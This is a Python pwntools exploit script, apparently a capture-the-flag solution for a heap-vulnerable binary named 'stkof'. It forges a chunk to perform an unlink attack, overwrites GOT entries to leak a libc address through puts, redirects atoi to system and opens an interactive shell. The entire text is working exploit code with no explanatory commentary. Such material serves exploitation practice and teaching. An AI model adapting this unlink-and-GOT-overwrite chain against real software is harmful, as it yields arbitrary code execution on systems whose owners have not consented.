from pwn import *

p = process('./stkof')
context.log_level = 'debug'
elf = ELF('stkof')
libc = ELF('libc.stkof.so')

heap_addr = 0x602140

def create(size) :
    p.sendline('1')
    sleep(0.1)
    p.sendline(str(size))

def edit(id_name,put_size,put_thing) :
    p.sendline('2')
    sleep(0.1)
    p.sendline(str(id_name))
    sleep(0.1)
    p.sendline(str(put_size))
    sleep(0.1)
    p.sendline(put_thing)

def delete(id_name) :
    p.sendline('3')
    sleep(0.1)
    p.sendline(str(id_name))

create(0x100)
sleep(0.1)
create(0x30)
sleep(0.1)
create(0x80)

#unlink
sleep(0.1)
payload = p64(0x0) + p64(0x31) + p64(heap_addr + 0x10 -0x18)
payload += p64(heap_addr + 0x10 - 0x10) + p64(0x0)*2 + p64(0x30)
payload += p64(0x90)
edit(2,len(payload),payload)
sleep(0.1)
#gdb.attach(p)
delete(3)

#xiugai
free_addr = elf.got['free']
puts_addr = elf.got['puts']
atoi_addr = elf.got['atoi']
puts_plt = elf.plt['puts']
payload2 = p64(0x0) + p64(free_addr) + p64(puts_addr) + p64(atoi_addr)
#gdb.attach(p)
sleep(0.1)
edit(2,len(payload2),payload2)

#free_got --> puts_plt
sleep(0.1)
payload3 = p64(puts_plt)
#gdb.attach(p)
edit(0,len(payload3),payload3)

#leak puts_got_addr
sleep(0.1)
delete(1)
p.recvuntil('\x46\x41\x49\x4c\x0a\x4f\x4b\x0a\x46\x41\x49\x4c\x0a')
data = u64(p.recv(6).ljust(8,'\x00'))
print hex(data)

#bin_addr system_addr
database = data - libc.symbols['puts']
bin_addr = database + libc.search('/bin/sh').next()
system_addr = database + libc.symbols['system']
print hex(bin_addr)

#atoi_got --> system
sleep(0.1)
payload4 = p64(system_addr)
#gdb.attach(p)
edit(2,len(payload4),payload4)

#start system
sleep(0.1)

p.interactive()
